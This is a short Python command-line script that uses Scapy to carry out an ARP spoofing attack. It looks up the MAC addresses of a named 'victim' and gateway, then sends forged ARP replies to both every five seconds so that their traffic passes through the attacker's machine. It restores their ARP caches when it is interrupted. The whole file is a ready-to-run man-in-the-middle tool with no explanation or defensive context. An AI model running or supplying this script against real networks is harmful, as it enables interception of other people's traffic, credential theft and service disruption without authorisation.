#!./venv/bin/python3

from scapy.all import Ether, ARP, srp, send
import argparse
import os
import time

parser = argparse.ArgumentParser(prog=os.path.basename(__file__))

parser.add_argument('victim', help='Victim IP')
parser.add_argument('gateway', help='Gateway IP')

args = parser.parse_args()


def get_mac(ip):
    print(f'* getting mac of {ip}')
    try:
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp = ARP(op=1, pdst=ip)
        pkt = ether / arp

        res = srp(pkt, timeout=2, verbose=False)

        mac = res[0][0][1].hwsrc

        print(f'+ {ip} is {mac.upper()}')

        return mac
    except Exception:
        print(f'! {ip} did not respond')
        quit(1)


def poison(victim_ip, victim_mac, source_ip):
    try:
        print(f'* poisoning {victim_ip}')
        arp = ARP(op=2, pdst=victim_ip, psrc=source_ip, hwdst=victim_mac)

        send(arp, verbose=False)
        print(f'+ {victim_ip} poisoned')
    except Exception:
        print(f'! could not poison {victim_ip}')
        quit(1)


def restore_arp_cache(victim_ip, victim_mac, source_ip, source_mac):
    try:
        print(f'+ restoring {victim_ip} arp cache')

        arp = ARP(
            op=2,
            pdst=victim_ip,
            psrc=source_ip,
            hwdst=victim_mac,
            hwsrc=source_mac
        )

        send(arp, verbose=False)

        print(f'+ {victim_ip} arp cache restored')
    except Exception:
        print(f'! could not restore arp cache for {victim_ip}')
        quit(1)


victim_mac = get_mac(args.victim)
gateway_mac = get_mac(args.gateway)


try:
    while True:
        time.sleep(5)

        poison(args.victim, victim_mac, args.gateway)
        poison(args.gateway, gateway_mac, args.victim)
except KeyboardInterrupt:
    print('* restoring ARP cache')

    restore_arp_cache(args.victim, victim_mac, args.gateway, gateway_mac)
    restore_arp_cache(args.gateway, gateway_mac, args.victim, victim_mac)

    print('+ ARP cache restored')
